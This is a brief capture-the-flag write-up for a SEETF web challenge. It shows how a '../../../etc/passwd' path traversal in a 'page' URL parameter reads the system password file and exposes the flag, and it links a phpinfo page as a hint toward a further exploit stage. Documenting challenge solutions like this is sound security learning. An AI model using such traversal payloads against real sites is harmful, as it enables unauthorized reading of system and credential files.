this was a basic dir traversal

just look at the cool website's url at page parameter and try to think like a hacker, what would you get hold of a file in linux machine:

/etc/passwd

that's it

the url as goes:

[http://sourcelessguessyweb.chall.seetf.sg:1337/?page=whysoserious](http://sourcelessguessyweb.chall.seetf.sg:1337/?page=whysoserious)

we change it to:

[http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd](http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd)

boom , look at the pg source , we get the flag:SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}s

nothing to see , just some headers for reference

[http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)